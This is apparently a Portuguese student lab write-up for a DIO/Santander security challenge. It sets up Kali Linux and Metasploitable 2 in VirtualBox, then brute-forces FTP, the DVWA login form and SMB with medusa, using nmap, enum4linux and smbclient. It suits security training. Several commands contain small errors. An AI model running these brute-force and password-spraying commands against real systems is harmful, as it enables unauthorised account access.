<h1 style="font-size:2.5rem; font-style:italic" align="center">Security</h1>

<h2 align="center">Este é um desafio da DIO patrocionado pela Santander.</h2>
<br>

### Indice
###### Downloads
- [Baixando O Virtual Box](#-Baixando-O-Virtual-Box)
- [Baixando Metasploitable 2](#-Baixando-Metasploitable-2)
- [Baixando Kali linux](#-Baixando-Kali-linux)
###### Instalações
- [Instalando o virtual box](#-Instalando-o-virtual-box)
- [Instalação do Kali linux no virtual box](#-Instalação-do-Kali-linux-no-virtual-box)
- [Instalando  o metasploitable 2](#-Instalando-o-metasploitable-2)
- [Configurações das redes metasploitable e kali linux](#-Configurações-das-redes-metasploitable-e-kali-linux)
###### Ataques
  - [Atacndo um servidor FTP](#-Atacndo-um-servidor-FTP)
  - [DVWA](#DVWA)
  - [Ataques smb](#-Ataques-smb)
  - [Password Spraying](#-Password-Spraying)
###### Pensando ....
- [Minhas Reflexões](#-Minhas-Reflexões)

<br><br><hr><br>

<h2 align="center">Baixando O Virtual Box</h2>
<br>

<p>
Antes de começar abaixe o virtual box. Há dois sites que podem lhe oferecer o sistema de virtualização, o primeiro é do proprio virtualbox:<br>

```bash
https://www.virtualbox.org/wiki/Downloads</div>
```
<br>
e o segundo é o site da oralce que comprouo o virtualbox e depois é só escolher seu sistema e sua arquiteruta, baixr e instalar.<br>

```bash
https://www.oracle.com/virtualization/technologies/vm/downloads/virtualbox-downloads.html
```
</p>
<br>
<hr>
<br>

<h3 align="center">Baixando Metasploitable 2</h3>

<p>Agora baixar o Metasploitable2  no seguinte site :</p> 

```bash
Metasploitable - Browse /Metasploitable2 at SourceForge.net
```
<p>
Depois clique para baixá-lo de acordo com a imagem abaixo:
</p>
<img src="images/metasploitable donwload 1.png">
<img src="images/metasploitable donwload 2.png"> 
<p>Observe os circulos vermelhos nas duas imagens. Você tem duas opções de clique, qualquer uma a baixará o metasploitable.</p>
<p>Ao clicar abrira outra janela ou o download começara imediatamente basta escolher onde você queira salvar ou download padrão </p>
<img src="images/download1.png">
<p>Caso isso aconteça clique no botão uma nova página surgirá e download lhe perguntara ou abaixará automaticamente</p>
<img src="images/donwload 2.png">



<br>
<hr>
<br>

<h3 align="center">Baixando Kali linux</h3>
<br>
<p>Para baixar o kali linux vc precisa ir no :</p>

```bash
 www.kali.linux.org 
```
<img src="images/kali-linux.png">
<p>Ao clicar no download você será redirecionado para outra página em seguida clique em virtual machines</p>
<img src="images/escolher virtual box.png">
<p>Ao clicar no VirtualBox o download iniciará.</p>

<br>
<hr>
<br>

<h3 align="center">Instalando o virtual box</h3>
<br>
<p>
Vá até onde você salvou o arquivo isso é onde você fez o download executê-o, vai abrir uma janela de permissão do firewal clique sim, depois aparecera a seguinte imagem: 
</p>
<img src="images/tela apresentação abertura virtual box.png">
<p>Espere um instante e aparecerá uma janela  de bem vindo</p>
<img src="images/janela de apresnetação do primeiro next.png">
<p>
Clica em next e aparecerera o contrato com a opção de aceitar o contrato desmarcado selecione o primeiro 
</p>
<img src="images/aceitar contrato.png">
<p>Clique em next e aparecera outra tela</p>
<img src="images/tela de costumização ir pra next direto.png">
<p>Clique em next e aparecera uma tela avisando que não pode se desconectar da inter nete ou algo do tipo</p>
<img src="images/tela de avisa que não pode se desconectar da net.png">
<p>
Clique me next e a prescera uma tela de dependências clica em next e aparecera outra tela seleciona tudo e clica em next, depois aparecera uma tela escrita install como na imagem abaixo: 
</p>
<img src="images/tela com botã ode install.png">
<p>Clica install ele iniciara o processo de instalação</p>
<img src="images/processo de instalação.png">
<p>Depois aparecera a seguinte tela:</p>
<img src="images/instalação concluida.png">
<p>Clique me finish e abrirá o virtual box</p>
<img src="images/virtualbox aberto.png">

<hr>
<br>
<h3 align="center">Instalação do Kali linux no virtual box</h3>
<br>
<p>
Agora que foi baixado o kali linux indicado, extraia ele em uma pasta, depois abra o virtual box e clique em open a saved VirtualBox MV 
</p>
<img src="images/pré-instalação do kali-linux.png">
<p>Depois de clicar onde está o circulo vaia abrir uma janela, vai até onde você extraiu o kali linux</p>
<img src="images/selecionnando kalilinux virtual box.png">
<p>Seleciona esse icone em azul e clique em abir</p>
<p>E o kali linux já estará instalado </p>
<img src="images/kali linux virutalmacine instalado no virtual box.png">

<hr>
<br>

<h3 align="center">Instalando  o metasploitable 2</h3>
<br>
<p>Vá até onde vc salvou o metasploitable descompacta ele, vá no virtual box clique no icone  Novo</p>
<img src="images/pre instalação metasploitable.png">
<p>
Vai abrir uma tela em seguida digite um nome. Onde está escrito OS escolha linux, onde esta escrito OS Distribuition escolha Ubuntu 
</p>
<img src="images/pre instalação metasploitable segunda parte.png">
<p>
Clique em finalizar, depois do vá no ícone de configurações representado por uma emgrangem clique nele e vamos terminar de instalar.
</p>
<img src="images/pre instalação metasploitable terceira parte.png">
<p>
Com o sistema selecionado vá em configurções  clique em armazenameto vai até controladora IDE: selecione ela clique em Add Hard Disk
</p>

<p>vai abrir a seguinte janela:</p>
<img src="images/pre instalação metasploitable quarta parte.png">
<p>
Clique em acrescentar e vai abrir uma janela e vai até onde vc descompactou o metasploitable selecione o ícone azul clique em abrir
</p>
<img src="images/pre instalação metasploitable quinta parte.png">
<p>Depois ele voltara para tela anterior clique em escolher, e  depois clique em ok</p>
<p>O metasploitable já estará instalado. </p>
<br>
<hr>
<br>

<h3 align="center">Configurações das redes metasploitable e kali linux</h3>
<p>
Selecione metasploitable vá em configurações selecione redes e clique no ligado a, 
E selecione Placa de Rede Exclusiva de hospedeiro (host-only) 
</p>
<img src="images/configurações das redes.png">
<p>Clique em ok e depois repita o mesmo processo para o kali linux.</p>
<p>
Agora abra o  metasploitable com um duplo clique espere carregar tudo depois digite senha e usuário que ele mesmo te indicara
</p>
<img src="images/metasploit primeira imagem dele aberto.PNG">
<p>
Ao acessar digite ifconfig ou ip a  para visualizar o endereço ip da maquina como circulando na imagem abaixo: 
</p>
<img src="images/ifconfig metasploit.PNG">
<p>
Esse circulado com a cor vermelha é o nosso ip alvo guarde bem ele e depois se quiser crie um snpashot pra salvarguardar o sistema de erros .
</p>

<br>
<hr>
<br>

<h3 align="center">Atacndo um servidor FTP</h3>
<p>Vamos primeiro verificar se um servidor FTP é antigo e com falhas na segurança no sentindo de estar exposto ou não. </p>

<p>Como eu já tenho meu alvo agora tenho que enumerar, ou seja, é a parte da colheita do meu alvo antes de atacá-lo</p> 
<p>
Primeiro para alcançar o nosso alvo vulnerável usaremos o ping –c 192.168.56.101 que é a nossa maquina alvo nesse exemplo, obviamente que isso se dar no kali linux</p> 
<img src="images/ftp/pingando nosso alvo.png">
<p>Como vc vê de tudo certo na nossa conexão com nosso alvo.</p>
<p>Agora vamos verificar se ele está exposto utilizando a ferramenta nmap para ver quais portas estão abertas e fechadas</p>

```bash
nmap –sV –p 21,22,80,445 192.168.56.101 
```

<p>Esse comando escaneia as portas mais utilizadas que é 21, 22, 80, 445</p>
<img src="images/ftp/portas abertas.png">
<p>Quando terminar de escanear veremos as saídas das portas.</p>

<p>Agora verificaremos se o serviço esta realmente ativo conectando diretamente no servidor ftp com o comando:</p> 

```bash
ftp 192.168.56.101 
```
<p>Caso apareça a seguinte tela apreça é porque está funcionando veja imagem com o circulo vermelho</p> 
<img src="images/ftp/tela boas vindas do ftp.png">

<p>Agora vamos invadir usando a técnica de força bruta usando a ferramenta medusa, primeiro criaremos as litas de usuários e senhas:</p> 

<p> primeiro criaaremos uma mini lista de usuários</p> 

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt 
``` 

<p>segundo criaremos uma mini lista de senhas</p> 

```bash 
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt 
``` 
<img src="images/ftp/mini listas de usuarios e senhas.png">
<p>Esses comandos criaram um aquivo de texto acessíveis vc pode abrir para conferir.</p>
<p>Agora realizaremos nosso ataque de força bruta com a ferramenta medusa eis a linha de comando para tal:</p> 

```bash 
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6 
``` 
<p>
Depois de executar medusa ele vai retornar com mensagem erro caso não consiga ter sucesso e se caso conseguiu ele lhe dará uma mensagem de sucesso.

A saída lhe dará a combinação válida para você acessar o protocolo ftp com sucesso após testar as outras combinações passando na lista que foi criado com o comando</p>
<img src="images/ftp/ataque for;a bruta com medusa com sucesso.png">
<br>
<p>Agora podemos testar manualmente e veja o que acontece usando o usuário e sanha que foi validada com sucesso.</p>
<img src="images/ftp/conexao bem sucedida .png">
<br>
<hr>
<br>

<h3 align="center">DVWA</h3>
<h4 align="center">Damn Vulnerable Web Application</h4>

<p>
Agora varemos um taques a formulários de login com força bruta

eis o nosso fomulario de exemplo digite com seu ip alvo no navegador o seguinte</p>

```bash
http://192.168.56.101/dvwa/login.php 
```
<img src="images/dvwa/formulario a ser atacado.png">
 
<p>Agora criaremos litas de palavras (World list)</p>

<p>
O que faremos? nós iremos pegar a pagina e o corpo da requisição caso em seis tentativas ele retorne a falha então obviamente ele falhou caso contrario o ataque foi bem sucedido</p> 

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \  -m PAGE: '/dvwa/login.php'\  -m FROM: 'Username=^USER^&password=^PASS^&Login=login' \  -m 'FAIL=login failed' -t 6 
```
<img src="images/dvwa/atacando formulario de login.png">
<p>Testando algumas senhas encontradas (FOUND)</p>
<img src="images/dvwa/acessando com uma das senhas.png">
<p>Se colocando umas das senhas descobertas burlar o login</p>
<img src="images/dvwa/login burlado com sucesso.png">

<h3 align="center">Ataques smb</h3>

<h4 align="center">Ataques em cadeia</h4> 

<p>Descobrindo serviços smb</p> 
<p>Primeiro vamos usar um comando que vai ativar todo tipo de enumeração possível sobre nosso alvo:</p>

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt 
```

<p>Depois de rodar digite o seguinte comando:</p>

```bash
less enum4_output.txt 
```
<p>Esse comando vai abrir um arquivo com diversas informações  caso queira sair da tela aperte a tecla “q”</p>

<p>Criando wordlist de usuários</p>

```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt 
```
<p>Esse comando vai alimentar a nossa ferramenta de ataque</p>

 
<h3 align="center">Password Spraying</h3>


<p>Password Spraying poucas senhas em muito usuários de forma silenciosa evitando o firewall</p> 

```bash
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt 
```
 
<p>Agora vamos utilizar a ferramenta medusa</p>

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
```
<img src="images/smb/ferramenta medusa executada no ataque smb.png">
<p>
Quando a aprece ACCOUNT FOUND é porque o ataque deu certo, ou seja, vc agora tem todo acesso inclusive ao painel  administrativo com esses dados.</p>
<img src="images/smb/ferramenta medusa executada no ataque smbII.png">

<p>Agora vou verificar para ver se eu tenho acesso ao administrador com o user name usado</p>

```bash
smbclient -L //192.168.56.101 -U msfadmin 
```
<p>Digte esse comando e aperte enter, e aparecerá uma tela pedindo a senha</p>
<img src="images/smb/pedindo senha do administrador.png">

<p>A pós digitar a senha vc terá o acesso ao administrador</p>
<img src="images/smb/acesso total ao administrador.png">

<p>Agora o ataque foi bem-sucedido podemos agora navegar e fazermos o que bem entendermos com esse acesso nesta máquina</p>

<br><br>

<hr>
<h2 align="center">Minhas Reflexões</h2>
<br>
<hr>

<p>Aprendi que se vc nã otiver usando certos protocolos é bom fechar.</p>
<p>Aprendi que nunca se deve deixar amostrar as versões dos progaams que vc está usando.</p>
<p>Vi como a preguiça de fornecer o minimo de cuidado ou criar fomularios é tenebroso para ser</p>
<p>
invadido por isso é bom usar Csrf que é uma medida de segurça para evitar que seus fomula´rios seja msequestrados
frameworks como Laravel e spring bott tem esses mecanismo de segurança.
</p>

<p>É sempre bom ter senhas fortes e mecanismo de fato para se conectar aserviçõs
sempre por um limite de acesso caso aja falhas.</p>

